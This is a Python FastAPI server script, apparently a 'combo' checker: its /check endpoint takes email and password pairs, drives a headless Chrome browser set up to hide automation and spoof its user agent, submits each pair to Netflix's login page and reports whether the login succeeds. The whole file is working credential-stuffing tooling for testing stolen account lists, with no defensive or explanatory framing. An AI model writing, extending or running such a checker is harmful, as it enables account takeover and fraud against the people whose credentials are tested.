# server.py
import os
import time
import requests
from typing import Optional

from fastapi import FastAPI, HTTPException, Header
from pydantic import BaseModel
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

from countries import find_IP  # returns (ip, country, country_code)

API_KEY   = os.getenv("API_KEY", "changeme")
LOGIN_URL = "https://www.netflix.com/login"

app = FastAPI(title="Geo-Aware Netflix Checker")


@app.on_event("startup")
def load_location():
    global PUBLIC_IP, GEO_COUNTRY, GEO_CODE, LOGIN_URL
    try:
        PUBLIC_IP, GEO_COUNTRY, GEO_CODE = find_IP()
    except Exception as e:
        print(f"[startup] find_IP failed: {e!r}")
        PUBLIC_IP, GEO_COUNTRY, GEO_CODE = ("0.0.0.0", "Unknown", "US")

    # build default LOGIN_URL based on server region
    code      = GEO_CODE.lower()
    LOGIN_URL = f"https://www.netflix.com/{code}-en/login"
    print(f"[startup] Server IP: {PUBLIC_IP}, Region: {GEO_COUNTRY} ({GEO_CODE})")
    print(f"[startup] Default LOGIN_URL = {LOGIN_URL}")


class Combo(BaseModel):
    email: str
    password: str
    region: Optional[str] = None  # override region code, e.g. "PH", "US"


def make_driver():
    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--window-size=1920,1080")
    opts.add_argument("--disable-blink-features=AutomationControlled")
    opts.add_argument(
        "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/114.0.5735.199 Safari/537.36"
    )
    driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(30)
    return driver


@app.post("/check", summary="Headless Netflix login check")
def check_combo(
    combo: Combo,
    x_api_key: str = Header(..., alias="x-api-key")
):
    if x_api_key != API_KEY:
        raise HTTPException(401, "Invalid API key")

    # determine login_url
    if combo.region:
        code = combo.region.strip().upper()
        login_url = f"https://www.netflix.com/{code.lower()}-en/login"
        print(f"[check] Region override: using {login_url}")
    else:
        login_url = LOGIN_URL
        print(f"[check] Using default LOGIN_URL: {login_url}")

    driver = make_driver()
    wait   = WebDriverWait(driver, 15)

    try:
        # 1) Navigate
        print(f"[check] GET {login_url}")
        try:
            driver.get(login_url)
        except TimeoutException:
            print("[check] Page load timeout")
            raise HTTPException(504, "Netflix page load timeout")

        # 2) Wait for login form
        print("[check] Waiting for login form")
        wait.until(EC.presence_of_element_located((By.NAME, "userLoginId")))

        # 3) Dismiss cookie banner
        try:
            btn = driver.find_element(By.ID, "onetrust-reject-all-handler")
            btn.click(); time.sleep(0.5)
        except NoSuchElementException:
            pass

        # 4) PIN toggle
        try:
            toggle = driver.find_element(
                By.CSS_SELECTOR, "button[data-uia='login-toggle-button']"
            )
            if "Use password" in toggle.text:
                toggle.click(); time.sleep(0.5)
        except NoSuchElementException:
            pass

        # 5) Fill & submit
        email_el = wait.until(EC.element_to_be_clickable((By.NAME, "userLoginId")))
        pwd_el   = driver.find_element(By.NAME, "password")
        email_el.clear(); email_el.send_keys(combo.email)
        pwd_el.clear();   pwd_el.send_keys(combo.password)
        pwd_el.send_keys(u"\ue007")  # ENTER

        # 6) Success check
        try:
            wait.until(lambda d:
                d.current_url.startswith("https://www.netflix.com/browse") or
                "profiles-gate-container" in d.page_source
            )
            success = True
        except TimeoutException:
            success = False

        return {
            "ok": success,
            "server_ip": PUBLIC_IP,
            "server_country": GEO_COUNTRY,
            "server_code": GEO_CODE,
            "login_url": login_url,
        }

    finally:
        driver.quit()
